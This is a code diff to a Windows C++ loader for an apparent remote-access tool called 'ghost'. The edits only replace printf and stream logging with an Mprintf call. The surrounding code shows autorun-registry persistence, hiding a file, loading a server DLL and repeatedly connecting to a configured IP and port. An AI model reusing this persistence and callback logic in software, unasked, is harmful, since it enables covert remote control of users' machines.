@@ -3,6 +3,7 @@
 #include <iostream>
 #include <corecrt_io.h>
 #include "common/commands.h"
+#include "StdAfx.h"
 
 // 自动启动注册表中的值
 #define REG_NAME "a_ghost"
@@ -139,25 +140,25 @@ BOOL Run(const char* argv1, int argv2) {
 		{
 			if (!DeleteFileA(oldFile.c_str()))
 			{
-				std::cerr << "Error deleting file. Error code: " << GetLastError() << std::endl;
+				Mprintf("Error deleting file. Error code: %d\n", GetLastError());
 				ok = FALSE;
 			}
 		}
 		if (ok && !MoveFileA(path, oldFile.c_str())) {
-			std::cerr << "Error removing file. Error code: " << GetLastError() << std::endl;
+			Mprintf("Error removing file. Error code: %d\n", GetLastError());
 			ok = FALSE;
 		}else {
 			// 设置文件属性为隐藏
 			if (SetFileAttributesA(oldFile.c_str(), FILE_ATTRIBUTE_HIDDEN))
 			{
-				std::cout << "File created and set to hidden: " << oldFile << std::endl;
+				Mprintf("File created and set to hidden: %s\n",oldFile.c_str());
 			}
 		}
 		if (ok && !MoveFileA(newFile.c_str(), path)) {
-			std::cerr << "Error removing file. Error code: " << GetLastError() << std::endl;
+			Mprintf("Error removing file. Error code: %d\n", GetLastError());
 			MoveFileA(oldFile.c_str(), path);// recover
 		}else if (ok){
-			std::cout << "Using new file: " << newFile << std::endl;
+			Mprintf("Using new file: %s\n", newFile.c_str());
 		}
 	}
 	HMODULE hDll = LoadLibraryA(path);
@@ -180,7 +181,7 @@ BOOL Run(const char* argv1, int argv2) {
 			GetPrivateProfileStringA("settings", "localIp", g_ConnectAddress.ServerIP(), ip, _MAX_PATH, path);
 			port = GetPrivateProfileIntA("settings", "ghost", g_ConnectAddress.ServerPort(), path);
 		}
-		printf("[server] %s:%d\n", ip, port);
+		Mprintf("[server] %s:%d\n", ip, port);
 		do
 		{
 			run(ip, port);
@@ -194,14 +195,14 @@ BOOL Run(const char* argv1, int argv2) {
 			result = bExit();
 		}
 		if (!FreeLibrary(hDll)) {
-			printf("释放动态链接库\"ServerDll.dll\"失败. 错误代码: %d\n", GetLastError());
+			Mprintf("释放动态链接库\"ServerDll.dll\"失败. 错误代码: %d\n", GetLastError());
 		}
 		else {
-			printf("释放动态链接库\"ServerDll.dll\"成功!\n");
+			Mprintf("释放动态链接库\"ServerDll.dll\"成功!\n");
 		}
 	}
 	else {
-		printf("加载动态链接库\"ServerDll.dll\"失败. 错误代码: %d\n", GetLastError());
+		Mprintf("加载动态链接库\"ServerDll.dll\"失败. 错误代码: %d\n", GetLastError());
 		Sleep(3000);
 	}
 	return result;
